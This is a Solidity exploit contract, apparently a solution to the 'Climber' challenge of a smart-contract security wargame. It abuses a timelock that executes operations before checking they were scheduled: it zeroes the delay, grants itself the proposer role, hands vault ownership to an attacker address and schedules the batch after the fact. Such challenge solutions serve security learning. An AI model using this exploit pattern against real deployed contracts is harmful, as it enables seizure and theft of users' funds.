// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../climber/ClimberTimelock.sol";

contract AttackerClimberVault {
    address public vault;
    address public timelock;

    address[] private _targets;
    uint256[] private _values;
    bytes[] private _dataElements;
    bytes32 private _salt;

    constructor(address vault_, address timelock_) {
        vault = vault_;
        timelock = timelock_;
    }

    function execute(address newOwner) external {
        _salt = 0;

        // set timelock delay to 0
        _targets.push(timelock);
        _values.push(0);
        _dataElements.push(abi.encodeWithSignature("updateDelay(uint64)", 0));

        _targets.push(timelock);
        _values.push(0);
        _dataElements.push(
            abi.encodeWithSignature(
                "grantRole(bytes32,address)",
                keccak256("PROPOSER_ROLE"),
                address(this)
            )
        );

        // transfer ownership of vault from timelock to attacker
        _targets.push(vault);
        _values.push(0);
        _dataElements.push(
            abi.encodeWithSignature("transferOwnership(address)", newOwner)
        );

        // schedule a callback into this contract (that in turns calls timelock's schedule)
        _targets.push(address(this));
        _values.push(0);
        _dataElements.push(abi.encodeWithSignature("scheduleToTimelock()"));

        // Execute the operations above
        ClimberTimelock(payable(timelock)).execute(
            _targets,
            _values,
            _dataElements,
            _salt
        );
    }

    function scheduleToTimelock() external {
        ClimberTimelock(payable(timelock)).schedule(
            _targets,
            _values,
            _dataElements,
            _salt
        );
    }
}
